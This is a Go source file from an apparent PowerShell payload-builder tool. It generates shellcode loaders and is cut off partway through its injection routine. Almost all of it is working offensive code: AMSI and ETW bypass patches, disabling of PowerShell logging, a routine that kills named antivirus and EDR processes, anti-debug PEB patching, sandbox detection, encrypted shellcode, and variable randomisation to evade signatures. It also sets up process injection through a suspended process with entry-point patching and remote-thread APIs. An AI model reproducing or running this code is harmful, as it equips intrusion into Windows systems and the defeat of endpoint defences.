package utils

import (
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"encoding/base64"
	"fmt"
	"math/rand"
	"powershellbuilder/models"
	"regexp"
	"strings"
)

// psQuote escapes a string for safe embedding inside a PowerShell
// single-quoted literal. PS single-quote escape is the doubled quote: `'` -> `''`.
// No other characters are special inside `'...'` (no backslash escapes), so
// this is sufficient.
func psQuote(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

// psQuoteDouble escapes a string for safe embedding inside a PowerShell
// double-quoted literal. PS double-quoted strings interpolate variables and
// treat backtick as an escape. We neutralize `, $, " and the backtick itself.
func psQuoteDouble(s string) string {
	r := strings.NewReplacer("`", "``", "$", "`$", "\"", "`\"")
	return r.Replace(s)
}

func XOREncrypt(data []byte, key string) []byte {
	encrypted := make([]byte, len(data))
	keyBytes := []byte(key)
	for i := 0; i < len(data); i++ {
		encrypted[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}
	return encrypted
}

func PKCS7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padByte := byte(padding)
	for i := 0; i < padding; i++ {
		data = append(data, padByte)
	}
	return data
}

func AESEncrypt(data []byte, key string) ([]byte, []byte, error) {
	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))

	paddedData := PKCS7Pad(data, aes.BlockSize)

	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return nil, nil, err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := cryptorand.Read(iv); err != nil {
		return nil, nil, err
	}

	ciphertext := make([]byte, len(paddedData))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, paddedData)

	return ciphertext, iv, nil
}

func RandomizeVariables(script string) string {
	usedNames := make(map[string]bool)

	randomName := func() string {
		for {
			name := fmt.Sprintf("$var%d", rand.Intn(99999))
			if !usedNames[name] {
				usedNames[name] = true
				return name
			}
		}
	}

	varMap := map[string]string{
		// Shellcode/crypto vars
		"$shellcode":             randomName(),
		"$encryptedShellcode":    randomName(),
		"$xorEncryptedShellcode": randomName(),
		"$key":                   randomName(),
		"$xorKey":                randomName(),
		"$decrypted":             randomName(),
		"$encryptedBytes":        randomName(),
		"$keyBytes":              randomName(),
				"$ciphertext":            randomName(),
		"$aes":                   randomName(),
		"$decryptor":             randomName(),
		// Process/injection vars
		"$procId":        randomName(),
		"$hProcess":      randomName(),
		"$hThread":       randomName(),
		"$fullPath":      randomName(),
		"$target":        randomName(),
		"$success":       randomName(),
		"$oldProtect":    randomName(),
		"$shellMem":      randomName(),
		"$bytesWritten":  randomName(),
		"$threadId":      randomName(),
		"$remoteThread":  randomName(),
		"$ntThread":      randomName(),
		"$epBytesW":      randomName(),
		"$epBytesW2":     randomName(),
		"$lastErr":       randomName(),
		// EP patching vars
		"$pebAddress":    randomName(),
		"$imageBaseBuf":  randomName(),
		"$bytesRead":     randomName(),
		"$imageBase":     randomName(),
		"$lfanewBuf":     randomName(),
		"$lfanew":        randomName(),
		"$aoeBuf":        randomName(),
		"$entryPointRVA": randomName(),
		"$entryPoint":    randomName(),
		"$originalBytes": randomName(),
		"$jmpSelf":       randomName(),
		"$retLen":        randomName(),
		// Dynamic type vars
		"$PL":      randomName(),
		"$NT":      randomName(),
		"$_id":     randomName(),
		"$_siObj":  randomName(),
		"$_piObj":  randomName(),
		"$_pbiObj": randomName(),
	}

	// Split around the C# here-string block so we never corrupt it
	const csStart = "$_tpl = @'"
	const csEnd = "'@\n$_cs = $_tpl"

	startIdx := strings.Index(script, csStart)
	if startIdx == -1 {
		return replaceVars(script, varMap)
	}
	endIdx := strings.Index(script[startIdx:], csEnd)
	if endIdx == -1 {
		return replaceVars(script, varMap)
	}
	endIdx += startIdx + len(csEnd)

	before := script[:startIdx]
	middle := script[startIdx:endIdx]
	after := script[endIdx:]

	return replaceVars(before, varMap) + middle + replaceVars(after, varMap)
}

func replaceVars(script string, varMap map[string]string) string {
	result := script
	for oldVar, newVar := range varMap {
		// Use word boundary regex to avoid partial replacements ($iv matching $ivData etc)
		// PowerShell variable names end at non-word chars
		// Escape the $ for regex
		// Match variable name followed by non-alphanumeric/non-underscore
		escaped := regexp.QuoteMeta(oldVar)
		re := regexp.MustCompile(escaped + `(?:[^a-zA-Z0-9_]|$)`)
		result = re.ReplaceAllStringFunc(result, func(match string) string {
			// Preserve the trailing non-var character
			suffix := match[len(oldVar):]
			return newVar + suffix
		})
	}
	return result
}

// stripPSComments removes PowerShell `#` line comments from the script while
// preserving comments inside string literals and inside `@'...'@` / `@"..."@`
// here-strings (so the embedded C# in our Add-Type prelude stays intact).
// Empty lines left behind by comment removal are dropped.
func stripPSComments(script string) string {
	lines := strings.Split(script, "\n")
	out := make([]string, 0, len(lines))
	inHere := false
	hereCloser := ""

	for _, line := range lines {
		if inHere {
			out = append(out, line)
			// PS here-string closer must be at line start.
			if strings.HasPrefix(strings.TrimLeft(line, " \t"), hereCloser) {
				inHere = false
				hereCloser = ""
			}
			continue
		}

		trimRight := strings.TrimRight(line, " \t")
		if strings.HasSuffix(trimRight, "@'") {
			out = append(out, line)
			inHere = true
			hereCloser = "'@"
			continue
		}
		if strings.HasSuffix(trimRight, "@\"") {
			out = append(out, line)
			inHere = true
			hereCloser = "\"@"
			continue
		}

		stripped := stripPSLineComment(line)
		if strings.TrimSpace(stripped) == "" {
			continue
		}
		out = append(out, strings.TrimRight(stripped, " \t"))
	}
	return strings.Join(out, "\n")
}

// stripPSLineComment removes the comment portion of a single line, ignoring
// `#` characters that fall inside single- or double-quoted strings.
func stripPSLineComment(line string) string {
	inSingle := false
	inDouble := false
	var out []byte
	for i := 0; i < len(line); i++ {
		c := line[i]
		if !inSingle && !inDouble && c == '#' {
			break
		}
		if c == '\'' && !inDouble {
			inSingle = !inSingle
		} else if c == '"' && !inSingle {
			inDouble = !inDouble
		}
		out = append(out, c)
	}
	return string(out)
}

func ObfuscateScript(script string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(script))
	obfuscated := fmt.Sprintf(`
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("%s"))
Invoke-Expression $decoded
`, encoded)
	return obfuscated
}

func GeneratePowerShell(opts models.BuildOptions) (string, error) {
	script := ""

	// NOTE: sandbox detection runs *after* AMSI/ETW bypasses below. Its
	// indicator strings ("VirtualBox", "Wireshark", etc.) are AMSI-flagged,
	// so evaluating them before AMSI is patched would block the script on a
	// hardened box. Emit deferred via a closure constant rather than a flag.

	if opts.AMSIBypass {
		amsiBypassType := opts.AMSIBypassType
		if amsiBypassType == "" {
			amsiBypassType = "amsiInitFailed"
		}

		switch amsiBypassType {
		case "amsiInitFailed":
			// Real amsiInitFailed: reflection-set the static field to $true so
			// AmsiUtils.ScanContent short-circuits. No P/Invoke needed.
			// String-split to avoid AMSI signature on the literal "AmsiUtils"/"amsiInitFailed".
			script += `
# AMSI Bypass - reflection-set AmsiUtils.amsiInitFailed = $true
try {
    $_asm = 'System.Management.Automation.A' + 'msi' + 'Utils'
    $_fld = 'amsi' + 'Init' + 'Failed'
    [Ref].Assembly.GetType($_asm).GetField($_fld, 'NonPublic,Static').SetValue($null, $true)
} catch {}
`
		case "AmsiContext":
			// Zero the amsiContext data (and null amsiSession). Different
			// vector from amsiInitFailed; corrupts the context AmsiUtils
			// hands to amsi.dll so the scan never gets a valid handle.
			script += `
# AMSI Bypass - corrupt AmsiUtils.amsiContext + null amsiSession
try {
    $_asm = 'System.Management.Automation.A' + 'msi' + 'Utils'
    $_fldCtx = 'amsi' + 'Context'
    $_fldSess = 'amsi' + 'Session'
    $r = [Ref].Assembly.GetType($_asm)
    $f = $r.GetField($_fldCtx, 'NonPublic,Static')
    $p = $f.GetValue($null)
    $g = $r.GetField($_fldSess, 'NonPublic,Static')
    if ($g) { $g.SetValue($null, $null) }
    if ($p -and ($p -ne [IntPtr]::Zero)) {
        [System.Runtime.InteropServices.Marshal]::WriteInt64($p, 0, 0)
    }
} catch {}
`
		case "ScanResult":
			script += `
# AMSI Bypass - AmsiScanBuffer patch (returns E_INVALIDARG so scan result is uninitialized)
try {
    Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
' -Name AsbW -Namespace AsbP -ErrorAction SilentlyContinue
    $amsiLib = [AsbP.AsbW]::LoadLibrary('am' + 'si.dll')
    if ($amsiLib -ne [IntPtr]::Zero) {
        $asbAddr = [AsbP.AsbW]::GetProcAddress($amsiLib, 'Amsi' + 'ScanBuffer')
        if ($asbAddr -ne [IntPtr]::Zero) {
            $oldP = [uint32]0
            [AsbP.AsbW]::VirtualProtect($asbAddr, 6, 0x40, [ref]$oldP) | Out-Null
            # mov eax, 0x80070057 (E_INVALIDARG); ret
            $patch = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asbAddr, 6)
            [AsbP.AsbW]::VirtualProtect($asbAddr, 6, $oldP, [ref]$oldP) | Out-Null
        }
    }
} catch {}
`
		case "PSLogPolicy":
			// Requires admin. String-split the value names so the path itself
			// doesn't trip AMSI before AMSI is patched elsewhere.
			script += `
# AMSI Bypass - PowerShell logging registry disable (requires admin)
$_psPolBase = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
$_sbName = 'Enable' + 'ScriptBlock' + 'Logging'
$_modName = 'Enable' + 'Module' + 'Logging'
New-ItemProperty -Path ($_psPolBase + '\Script' + 'BlockLogging') -Name $_sbName -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
New-ItemProperty -Path ($_psPolBase + '\Module' + 'Logging') -Name $_modName -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
`
		}
	}

	if opts.ETWBypass {
		etwBypassType := opts.ETWBypassType
		if etwBypassType == "" {
			etwBypassType = "DisableETW"
		}

		switch etwBypassType {
		case "etwPatch":
			script += `
# ETW Bypass - patch ntdll!EtwEventWrite prologue to RET
try {
    Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
' -Name EwW -Namespace EwP -ErrorAction SilentlyContinue
    $ntdll = [EwP.EwW]::GetModuleHandle('nt' + 'dll.dll')
    if ($ntdll -ne [IntPtr]::Zero) {
        $eew = [EwP.EwW]::GetProcAddress($ntdll, 'Etw' + 'EventWrite')
        if ($eew -ne [IntPtr]::Zero) {
            $oldP = [uint32]0
            [EwP.EwW]::VirtualProtect($eew, 1, 0x40, [ref]$oldP) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteByte($eew, 0xC3)
            [EwP.EwW]::VirtualProtect($eew, 1, $oldP, [ref]$oldP) | Out-Null
        }
    }
} catch {}
`
		case "DisableETW":
			script += `
# ETW Bypass - Disable Event Tracing
$env:COMPLUS_ETWEnabled = 0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', '0', 'Process')
`
		case "CLRProfiling":
			script += `
# ETW Bypass - CLR Profiling Disable
[Environment]::SetEnvironmentVariable('COMPlus_ProfAPI_ProfilerCompatibilitySetting', '0', 'Process')
[Environment]::SetEnvironmentVariable('COMPlus_DisableNativeImageLoadOptimization', '1', 'Process')
`
		case "DisableTracing":
			script += `
# ETW Bypass - Disable All Tracing
logman stop EventLog-System -ets 2>$null
logman stop Circular Kernel Context Logger -ets 2>$null
`
		}
	}

	if opts.EDRBypassType == "KillAV" {
		// Best-effort: requires elevation; protected AV processes will refuse to die.
		// This is a *loud* technique - tier-1 EDR alert. Included for completeness.
		script += `
# EDR Bypass - KillAV (best-effort, requires admin; protected processes will be skipped)
$avProcs = @('MsMpEng','MsSense','SenseIR','SenseCncProxy','SenseNdr','CSFalconService','CSFalconContainer','AvastSvc','AVGSvc','BdAgent','vsserv','ekrn','egui','SophosUI','SophosAgent','MBAMService','TmListen','PccNTMon','ccSvcHst','smc','smcgui','rphcp','xagt','TaniumClient','SentinelAgent','SentinelHelperService')
foreach ($n in $avProcs) {
    Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
`
	} else if opts.EDRBypassType == "PEBPatch" {
		// Real PEB patch: clear BeingDebugged + NtGlobalFlag in current process PEB
		// (anti-debug evasion). Uses NtQueryInformationProcess to locate PEB.
		script += `
# EDR Bypass - PEB patch (clears BeingDebugged + NtGlobalFlag for anti-debug evasion)
try {
    Add-Type -MemberDefinition '
[DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, IntPtr i, int l, IntPtr r);
' -Name PNT -Namespace PebP -ErrorAction SilentlyContinue
    $bufSize = if ([IntPtr]::Size -eq 8) { 48 } else { 24 }
    $buf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufSize)
    try {
        $rc = [PebP.PNT]::NtQueryInformationProcess((Get-Process -Id $PID).Handle, 0, $buf, $bufSize, [IntPtr]::Zero)
        if ($rc -eq 0) {
            $peb = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($buf, [IntPtr]::Size)
            # BeingDebugged @ PEB+0x02
            [System.Runtime.InteropServices.Marshal]::WriteByte($peb, 0x02, 0)
            # NtGlobalFlag @ PEB+0xBC (x64) or PEB+0x68 (x86)
            $ntGlobalOff = if ([IntPtr]::Size -eq 8) { 0xBC } else { 0x68 }
            [System.Runtime.InteropServices.Marshal]::WriteByte($peb, $ntGlobalOff, 0)
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
    }
} catch {}
`
	}

	if opts.SandboxDetection {
		// Runs AFTER AMSI/ETW patches so flagged indicator strings are safe
		// to evaluate inline. Concatenated strings ('Virtual'+'Box') to avoid
		// signature hits if user disabled the AMSI bypass.
		script += `
# Sandbox/VM Detection (post-AMSI-bypass)
function Detect-Sandbox {
    $detected = $false
    $vmIndicators = @(('Virtual'+'Box'), ('VM'+'ware'), ('Hyper'+'-V'), 'QEMU', 'Xen', 'Parallels')
    foreach ($vm in $vmIndicators) {
        if ((Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).Name -match $vm) { $detected = $true }
        if (Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match $vm }) { $detected = $true }
    }
    $analysisTools = @(('Sys'+'Internals'), ('Wire'+'shark'), ('Process'+'Monitor'), 'IDA', ('Win'+'Dbg'), 'x64dbg', 'Frida')
    if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -match ($analysisTools -join '|') }) { $detected = $true }
    if ((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Manufacturer -match (('innotek'+'|'+'Virtual'+'Box'+'|'+'VM'+'ware'+'|'+'Xen'))) { $detected = $true }
    if ($detected) { Write-Host '[!] Sandbox/VM detected, exiting'; exit 1 }
}
Detect-Sandbox
`
	}

	if opts.TelemetryNoise {
		script += "[System.Threading.Thread]::Sleep(500); Get-Date | Out-Null; [System.GC]::Collect()\n"
	}

	if opts.SleepMasking || opts.ExecutionDelay != 0 {
		if opts.ExecutionDelay == -1 {
			script += `Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 600)
`
		} else if opts.ExecutionDelay > 0 {
			script += fmt.Sprintf(`Start-Sleep -Seconds %d
`, opts.ExecutionDelay)
		} else {
			script += `Start-Sleep -Seconds 3
`
		}
	}

	if opts.HideWindow {
		script += `
# Hide Window
Add-Type -Name Win32ShowWindowAsync -Namespace Win32 -MemberDefinition '
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
' -ErrorAction SilentlyContinue
$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne [IntPtr]::Zero) {
    [Win32ShowWindowAsync]::ShowWindowAsync($hwnd, 0) | Out-Null
}
`
	}

	// opts.Shellcode is the base64-encoded payload (the handler guarantees
	// this for both the textarea and .bin upload paths). Decode it so the
	// encryption routines work on the actual shellcode bytes, not the
	// ASCII of the base64 string.
	shellcodeBytes, err := base64.StdEncoding.DecodeString(opts.Shellcode)
	if err != nil {
		return "", fmt.Errorf("invalid base64 shellcode: %w", err)
	}

	if opts.Encrypt && opts.EncryptType != "" {
		if opts.EncryptType == "AES" {
			ciphertext, iv, err := AESEncrypt(shellcodeBytes, opts.AESKey)
			if err != nil {
				return "", err
			}

			encryptedData := append(iv, ciphertext...)
			encodedEncrypted := base64.StdEncoding.EncodeToString(encryptedData)

			script += fmt.Sprintf(`
# AES Decryption Function
function Decrypt-AES {
    param([string]$EncryptedData, [string]$Key)
    
    if ([string]::IsNullOrEmpty($EncryptedData)) {
        Write-Host "[!] Empty encrypted data"
        return @()
    }
    
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedData)
        
        if ($encryptedBytes.Length -lt 16) {
            Write-Host "[!] Encrypted data too short: $($encryptedBytes.Length) bytes"
            return @()
        }
        
        $keyBytes = New-Object byte[] 32
        $keyBuffer = [System.Text.Encoding]::UTF8.GetBytes($Key)
        [System.Buffer]::BlockCopy($keyBuffer, 0, $keyBytes, 0, [Math]::Min($keyBuffer.Length, 32))
        $aesIV = New-Object byte[] 16
        $ciphertext = New-Object byte[] ($encryptedBytes.Length - 16)
        [System.Buffer]::BlockCopy($encryptedBytes, 0, $aesIV, 0, 16)
        [System.Buffer]::BlockCopy($encryptedBytes, 16, $ciphertext, 0, $ciphertext.Length)
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $keyBytes
        $aes.IV = $aesIV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $decryptor = $aes.CreateDecryptor()
        try {
            $decrypted = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            Write-Host "[+] Decrypted $($decrypted.Length) bytes"
            return $decrypted
        }
        finally {
            $decryptor.Dispose()
            $aes.Dispose()
        }
    }
    catch {
        Write-Host "[!] AES decryption failed: $_"
        return @()
    }
}

$key = '%s'
$encryptedShellcode = '%s'
$shellcode = Decrypt-AES $encryptedShellcode $key
`, psQuote(opts.AESKey), encodedEncrypted)

		} else if opts.EncryptType == "XOR" {
			xorEncrypted := XOREncrypt(shellcodeBytes, opts.XORKey)
			encodedXOR := base64.StdEncoding.EncodeToString(xorEncrypted)

			script += fmt.Sprintf(`
# XOR Decryption Function
function Decrypt-XOR {
    param([string]$EncryptedData, [string]$Key)
    
    if ([string]::IsNullOrEmpty($EncryptedData)) {
        Write-Host "[!] Empty encrypted data"
        return @()
    }
    
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedData)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
        $decrypted = New-Object byte[] $encryptedBytes.Length
        for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
            $decrypted[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i %% $keyBytes.Length]
        }
        Write-Host "[+] Decrypted $($decrypted.Length) bytes"
        return $decrypted
    }
    catch {
        Write-Host "[!] XOR decryption failed: $_"
        return @()
    }
}

$xorKey = '%s'
$xorEncryptedShellcode = '%s'
$shellcode = Decrypt-XOR $xorEncryptedShellcode $xorKey
`, psQuote(opts.XORKey), encodedXOR)
		}
	} else {
		encodedShellcode := base64.StdEncoding.EncodeToString(shellcodeBytes)
		script += `$shellcode = [System.Convert]::FromBase64String('` + encodedShellcode + `')
Write-Host "[+] Loaded $($shellcode.Length) bytes of shellcode"
`
	}

	script += `
# Validate shellcode
if ($shellcode.Length -eq 0) {
    Write-Host "[!] ERROR: Shellcode is empty or invalid"
    exit 1
}

# Verify shellcode is not an EXE
if ($shellcode.Length -gt 2 -and $shellcode[0] -eq 0x4D -and $shellcode[1] -eq 0x5A) {
    Write-Host "[!] ERROR: Shellcode appears to be an EXE file (MZ header detected)"
    Write-Host "[!] Please use raw shellcode (.bin) format, not executable format"
    exit 1
}

Write-Host "[+] Shellcode validated: $($shellcode.Length) bytes"
`

	// --- Win32 / ntdll P/Invoke prelude --------------------------------
	// Defines $PL (kernel32 + a couple of ntdll calls used through it),
	// $NT (ntdll), $_id (random class suffix so re-running in the same
	// PowerShell session doesn't collide), and instances of STARTUPINFO /
	// PROCESS_INFORMATION used by the spawn path. The C# source is wrapped
	// in $_tpl = @'...'@ / $_cs = $_tpl markers so RandomizeVariables()
	// skips over it instead of rewriting identifiers inside the C# block.
	script += `
$_tpl = @'
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO__UID__ {
    public Int32 cb;
    public IntPtr lpReserved;
    public IntPtr lpDesktop;
    public IntPtr lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION__UID__ {
    public IntPtr hProcess;
    public IntPtr hThread;
    public Int32 dwProcessId;
    public Int32 dwThreadId;
}

[StructLayout(LayoutKind.Sequential)]
public struct PBI__UID__ {
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public IntPtr BasePriority;
    public IntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}

public class PL__UID__ {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory,
        ref STARTUPINFO__UID__ lpStartupInfo, ref PROCESS_INFORMATION__UID__ lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern int GetLastError();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref int lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass,
        ref PBI__UID__ ProcessInformation, int ProcessInformationLength, ref int ReturnLength);
}

public class NT__UID__ {
    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes,
        IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended,
        int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [DllImport("ntdll.dll")]
    public static extern int NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine,
        IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);
}
'@
$_cs = $_tpl
$_id = ([Math]::Abs((Get-Random))).ToString()
$_cs = $_cs -replace '__UID__', $_id
Add-Type -TypeDefinition $_cs -ErrorAction Stop
$PL = Invoke-Expression ('[PL' + $_id + ']')
$NT = Invoke-Expression ('[NT' + $_id + ']')
$_siObj = New-Object ('STARTUPINFO' + $_id)
$_siObj.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($_siObj)
$_piObj = New-Object ('PROCESS_INFORMATION' + $_id)
`

	// --- Process spawning -----------------------------------------------
	// $_needSuspended drives whether we can use an existing process.
	// QueueUserAPC requires a suspended main thread we own, so we MUST
	// spawn fresh for that injection method. CRT/NCT work against either.
	needSuspended := "false"
	if opts.InjectionMethod == "QueueUserAPC" {
		needSuspended = "true"
	}
	script += fmt.Sprintf(`
# Find or spawn target process
Write-Host "[*] Setting up target process..."
$target = "%s"
$_needSuspended = $%s

# Try to find an already-running instance (skipped when injection requires a
# fresh suspended process, e.g. QueueUserAPC EarlyBird).
$existingProc = $null
if (-not $_needSuspended) {
    $existingProc = Get-Process | Where-Object { $_.Name -eq ($target -replace '\.exe$','') } | Select-Object -First 1
}
if ($existingProc) {
    $procId   = $existingProc.Id
    $hProcess = $PL::OpenProcess(0x1FFFFF, $false, $procId)
    if ($hProcess -eq [IntPtr]::Zero) {
        $lastErr = $PL::GetLastError()
        Write-Host "[!] OpenProcess failed on existing PID $procId (LastError: $lastErr - likely needs elevation for this target)"
        exit 1
    }
    $hThread  = [IntPtr]::Zero
    Write-Host "[+] Found existing process (PID: $procId)"
    $_spawnedNew = $false
} else {
    # Spawn new - use a long-lived host process, not a GUI app
    $fullPath = $target
    if ($target -notmatch '\\' -and $target -notmatch ':') {
        $systemPaths = @(
            "$env:SystemRoot\System32\$target",
            "$env:SystemRoot\$target",
            "$env:SystemRoot\SysWOW64\$target"
        )
        foreach ($testPath in $systemPaths) {
            if (Test-Path $testPath) { $fullPath = $testPath; break }
        }
    }
    Write-Host "[*] Resolved path: $fullPath"

    $_cmdLine = ('"' + $fullPath + '"')
    $success = $PL::CreateProcess($fullPath, $_cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$_siObj, [ref]$_piObj)
    if (-not $success -or $_piObj.dwProcessId -eq 0) {
        $lastErr = $PL::GetLastError()
        Write-Host "[!] CreateProcess failed (LastError: $lastErr)"
        exit 1
    }
    $procId   = $_piObj.dwProcessId
    $hProcess = $_piObj.hProcess
    $hThread  = $_piObj.hThread
    $_spawnedNew = $true
    Write-Host "[+] Process spawned suspended (PID: $procId)"
}

if ($_spawnedNew) {
    # EP patch only needed for suspended process we spawned
    $_pbiObj = New-Object ("PBI" + $_id)
    $retLen = 0
    $PL::NtQueryInformationProcess($hProcess, 0, [ref]$_pbiObj, [System.Runtime.InteropServices.Marshal]::SizeOf($_pbiObj), [ref]$retLen) | Out-Null
    $pebAddress = $_pbiObj.PebBaseAddress
    Write-Host "[+] PEB: 0x$($pebAddress.ToString('X'))"

    $imageBaseBuf = New-Object byte[] 8
    $bytesRead = 0
    $PL::ReadProcessMemory($hProcess, [IntPtr]::new($pebAddress.ToInt64() + 0x10), $imageBaseBuf, 8, [ref]$bytesRead) | Out-Null
    $imageBase = [IntPtr]::new([BitConverter]::ToInt64($imageBaseBuf, 0))
    Write-Host "[+] Image base: 0x$($imageBase.ToString('X'))"

    $lfanewBuf = New-Object byte[] 4
    $PL::ReadProcessMemory($hProcess, [IntPtr]::new($imageBase.ToInt64() + 0x3C), $lfanewBuf, 4, [ref]$bytesRead) | Out-Null
    $lfanew = [BitConverter]::ToInt32($lfanewBuf, 0)

    $aoeBuf = New-Object byte[] 4
    $PL::ReadProcessMemory($hProcess, [IntPtr]::new($imageBase.ToInt64() + $lfanew + 0x28), $aoeBuf, 4, [ref]$bytesRead) | Out-Null
    $entryPointRVA = [BitConverter]::ToInt32($aoeBuf, 0)
    $entryPoint = [IntPtr]::new($imageBase.ToInt64() + $entryPointRVA)
    Write-Host "[+] Entry point: 0x$($entryPoint.ToString('X'))"

    $originalBytes = New-Object byte[] 2
    $PL::ReadProcessMemory($hProcess, $entryPoint, $originalBytes, 2, [ref]$bytesRead) | Out-Null
    Write-Host "[+] Original EP bytes: 0x$($originalBytes[0].ToString('X2')) 0x$($originalBytes[1].ToString('X2'))"

    $oldProtect = [uint32]0
    $PL::VirtualProtectEx($hProcess, $entryPoint, [IntPtr]::new(2), 0x40, [ref]$oldProtect) | Out-Null
    $jmpSelf = [byte[]](0xEB, 0xFE)
    $epBytesW = 0
    $PL::WriteProcessMemory($hProcess, $entryPoint, $jmpSelf, 2, [ref]$epBytesW) | Out-Null
    Write-Host "[+] Entry point patched with JMP-to-self"

    $PL::ResumeThread($hThread) | Out-Null
    Write-Host "[+] Main thread resumed (spinning at EP)"
    Start-Sleep -Milliseconds 300
} else {
    # For existing process, these aren't used - set safe defaults
    $entryPoint   = [IntPtr]::Zero
    $originalBytes = [byte[]](0x00, 0x00)
    $oldProtect    = [uint32]0
